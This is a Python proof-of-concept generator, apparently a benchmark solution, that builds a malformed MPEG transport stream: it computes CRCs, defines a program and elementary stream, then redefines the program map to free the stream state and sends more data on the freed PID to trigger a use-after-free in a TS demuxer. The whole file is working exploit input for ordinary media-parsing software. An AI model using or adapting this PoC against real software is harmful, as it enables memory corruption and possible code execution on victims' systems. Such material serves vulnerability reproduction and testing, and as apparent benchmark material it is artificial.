class Solution:
    def _crc32_mpeg2(self, data: bytes) -> int:
        crc = 0xFFFFFFFF
        poly = 0x04C11DB7
        for byte in data:
            crc ^= (byte << 24)
            for _ in range(8):
                if crc & 0x80000000:
                    crc = (crc << 1) ^ poly
                else:
                    crc = crc << 1
        return crc & 0xFFFFFFFF

    def solve(self, src_path: str) -> bytes:
        poc = bytearray()
        PKT_SIZE = 188

        # Packet 1: PAT (Program Association Table)
        # Defines program 1 with PMT at PID 0x0100
        pat_header = b'\x47\x40\x00\x10'
        pat_pointer = b'\x00'
        pat_section_data = b'\x00\xb0\x0d\x00\x01\xc1\x00\x00\x00\x01\xf1\x00'
        pat_crc = self._crc32_mpeg2(pat_section_data).to_bytes(4, 'big')
        pat_section = pat_section_data + pat_crc
        pat_payload = pat_pointer + pat_section
        pat_padding = b'\xff' * (PKT_SIZE - len(pat_header) - len(pat_payload))
        pat_packet = pat_header + pat_payload + pat_padding
        poc.extend(pat_packet)

        # Packet 2: PMT (Program Map Table) v0
        # Defines ES with PID 0x0101 for program 1
        pmt_header_v0 = b'\x47\x41\x00\x10'
        pmt_pointer = b'\x00'
        pmt_section_data_v0 = b'\x02\xb0\x12\x00\x01\xc1\x00\x00\xe1\x01\xf0\x00\x1b\xe1\x01\xf0\x00'
        pmt_crc_v0 = self._crc32_mpeg2(pmt_section_data_v0).to_bytes(4, 'big')
        pmt_section_v0 = pmt_section_data_v0 + pmt_crc_v0
        pmt_payload_v0 = pmt_pointer + pmt_section_v0
        pmt_padding_v0 = b'\xff' * (PKT_SIZE - len(pmt_header_v0) - len(pmt_payload_v0))
        pmt_packet_v0 = pmt_header_v0 + pmt_payload_v0 + pmt_padding_v0
        poc.extend(pmt_packet_v0)

        # Packet 3: Data for ES PID 0x0101
        # Initializes the stream state
        es_header = b'\x47\x41\x01\x10'
        pes_packet_header = b'\x00\x00\x01\xe0\x00\x00\x80\x00\x00'
        es_payload = pes_packet_header + b'\xaa' * (PKT_SIZE - len(es_header) - len(pes_packet_header))
        es_packet = es_header + es_payload
        poc.extend(es_packet)

        # Packet 4: PMT (Program Map Table) v1
        # Redefines program 1 with no elementary streams, triggering the free()
        pmt_header_v1 = b'\x47\x41\x00\x11'
        pmt_section_data_v1 = b'\x02\xb0\x0d\x00\x01\xc3\x00\x00\xe1\x01\xf0\x00'
        pmt_crc_v1 = self._crc32_mpeg2(pmt_section_data_v1).to_bytes(4, 'big')
        pmt_section_v1 = pmt_section_data_v1 + pmt_crc_v1
        pmt_payload_v1 = pmt_pointer + pmt_section_v1
        pmt_padding_v1 = b'\xff' * (PKT_SIZE - len(pmt_header_v1) - len(pmt_payload_v1))
        pmt_packet_v1 = pmt_header_v1 + pmt_payload_v1 + pmt_padding_v1
        poc.extend(pmt_packet_v1)

        # Packet 5: Data for ES PID 0x0101 (again)
        # Triggers the use-after-free
        es_uaf_header = b'\x47\x01\x01\x11'
        es_uaf_payload = b'\xbb' * (PKT_SIZE - len(es_uaf_header))
        es_uaf_packet = es_uaf_header + es_uaf_payload
        poc.extend(es_uaf_packet)

        return bytes(poc)